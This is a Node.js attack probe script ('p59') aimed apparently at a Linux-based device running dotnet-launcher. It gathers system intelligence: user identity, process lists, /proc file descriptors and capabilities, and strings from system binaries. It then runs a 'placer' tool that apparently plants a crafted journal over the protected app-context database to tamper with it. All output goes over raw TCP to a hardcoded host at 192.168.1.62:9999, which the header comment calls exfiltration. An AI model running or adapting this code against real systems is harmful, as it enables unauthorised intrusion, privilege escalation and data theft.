"use strict";

/* p59: group-write journal + root forensics
   1. identity + user-space ps (no kernel threads) + RunningAppsService PID
   2. RunningAppsService forensics: ls, strings (DBus names, db paths), /proc/PID/fd, cmdline, unit files
   3. /tmp/dotnet_error.*.log + dotnet_pipe* (from p56/p57 runs)
   4. tools: dbus-send/gdbus/busctl, libc names, sqlite version, wasutility strings
   5. placer group: dotnet-launcher --standalone PLDIR/placer.dll group -> placer.log
   6. verify: dst md5 + live db md5 + staged md5
   exfil /p59info
 */

var fs = null, cp = null, net = null;
try { fs = require('fs'); } catch (e) {}
try { cp = require('child_process'); } catch (e) {}
try { net = require('net'); } catch (e) {}

var HOST = '192.168.1.62';
var PORT = 9999;
var PLDIR = '/home/owner/share/tmp/sdk_tools';
var DL = '/usr/bin/dotnet-launcher';
var PLOG = PLDIR + '/placer.log';
var R = { ts: new Date().toISOString(), probe: 'p59', results: {}, log: [] };
var posted = false;

function L(s) { R.log.push(String(s).substring(0, 500)); }

function postBuf(path, buf) {
  var hdr = 'POST ' + path + ' HTTP/1.1\r\nHost: ' + HOST + ':9999\r\nContent-Type: application/octet-stream\r\nContent-Length: ' + buf.length + '\r\nConnection: close\r\n\r\n';
  try {
    var s = net.connect(PORT, HOST);
    s.setTimeout(90000, function () { s.destroy(); });
    s.on('connect', function () {
      s.write(hdr);
      var off = 0;
      var iv = setInterval(function () {
        if (off >= buf.length) { clearInterval(iv); setTimeout(function () { s.destroy(); }, 3000); return; }
        s.write(buf.slice(off, off + 65536));
        off += 65536;
      }, 50);
      setTimeout(function () { s.destroy(); }, 240000);
    });
    s.on('error', function (e) { L('postBuf err ' + e.message); });
  } catch (e) { L('postBuf ctor ' + e); }
}

function postFinal() {
  if (posted) return;
  posted = true;
  postBuf('/p59info', new Buffer(JSON.stringify(R), 'utf8'));
}

function run(cmd, timeoutMs) {
  try {
    var out = cp.execSync(cmd, { timeout: timeoutMs || 25000, maxBuffer: 16 * 1024 * 1024 }).toString().trim();
    return '[exit 0] ' + out;
  } catch (e) {
    var o = '';
    if (e.stdout) o += e.stdout.toString();
    if (e.stderr) o += (o ? '\n' : '') + e.stderr.toString();
    return '[exit ' + (e.status === undefined ? '?' : e.status) + '] ' + (o || (e && e.message) || 'unknown').substring(0, 8000);
  }
}

function readLog() {
  try {
    var c = fs.readFileSync(PLOG, 'utf8');
    return '[exists ' + c.length + ' chars] ' + c;
  } catch (e) {
    return '[no log: ' + e.message + ']';
  }
}

function main() {
  R.results.identity = run('id 2>&1; echo ===PS_USER===; ps -ef 2>/dev/null | grep -v "[k]" | head -150', 30000);

  // 2) RunningAppsService forensics
  R.results.ras_ls = run('ls -la /usr/bin/RunningAppsService 2>&1; echo ===SIZE===; wc -c /usr/bin/RunningAppsService 2>&1', 15000);
  R.results.ras_strings = run('strings /usr/bin/RunningAppsService 2>&1 | grep -iE "dbus|org\\.|interface|app-context|dbspace|\\.db|context|home|xf86|key|signal|method|path" | head -100', 30000);
  R.results.ras_proc = run('for d in /proc/[0-9]*; do if grep -qa "RunningAppsService" $d/cmdline 2>/dev/null; then echo "RAPID=$(basename $d)"; echo ===FD===; ls -la $d/fd 2>&1 | head -40; echo ===CMDLINE===; cat $d/cmdline 2>/dev/null | tr "\\0" " "; echo; echo ===STATUS===; grep -E "Uid|CapBnd|CapEff" $d/status 2>/dev/null; fi; done 2>&1 | head -120', 30000);
  R.results.ras_unit = run('grep -rl "RunningAppsService" /etc /usr/lib/systemd /usr/share/dbus-1 2>/dev/null | head -10; echo ===CAT===; for f in /usr/lib/systemd/system/*RunningApps* /etc/systemd/system/*RunningApps*; do echo "--- $f"; cat "$f" 2>/dev/null; done', 30000);

  // 3) dotnet error logs + pipes
  R.results.dotnet_tmp = run('ls -la /tmp/dotnet_error.* /tmp/dotnet_pipe* 2>&1; echo ===ERRLOGS===; cat /tmp/dotnet_error.*.log 2>/dev/null | head -80', 20000);

  // 4) tools + sqlite + libc + wasutility
  R.results.tools = run('which dbus-send dbus-binding-tool gdbus busctl strings 2>&1; echo ===LIBC===; ls -la /lib/libc* /lib/ld-* /lib/libdl* /usr/lib/libc* 2>&1 | head -20; echo ===SQLITE===; ls -la /usr/lib/libsqlite3* 2>&1; strings /usr/lib/libsqlite3.so.0 2>/dev/null | grep -oE "3\\.[0-9]+\\.[0-9]+[a-z]*" | sort -u | tail -5', 30000);
  R.results.wasutility = run('ls -la /usr/bin/wasutility 2>&1; strings /usr/bin/wasutility 2>&1 | head -120', 30000);

  // 5) placer group
  run('rm -f ' + PLOG + ' 2>&1', 5000);
  R.results.s_group = run(DL + ' --standalone ' + PLDIR + '/placer.dll group 2>&1; echo s_group_exit=$?', 120000);
  R.results.group_log = readLog();

  // 6) verify
  R.results.verify = run('echo ===DST===; ls -la /opt/dbspace/.app-context.db-journal 2>&1; md5sum /opt/dbspace/.app-context.db-journal 2>&1; echo ===LIVE===; ls -la /opt/dbspace/.app-context.db 2>&1; md5sum /opt/dbspace/.app-context.db 2>&1; echo ===STAGED===; md5sum ' + PLDIR + '/appctx_hot_journal 2>&1; echo ===DBSPACE===; ls -la /opt/dbspace/ 2>&1 | head -20', 20000);

  R.results.final = 'done ' + new Date().toISOString();
  L('done ' + new Date().toISOString());
  postFinal();
  setTimeout(postFinal, 15000);
}

try { main(); } catch (e) { R.results.fatal = String(e) + ' | ' + (e.stack || 'no-stack'); postFinal(); }
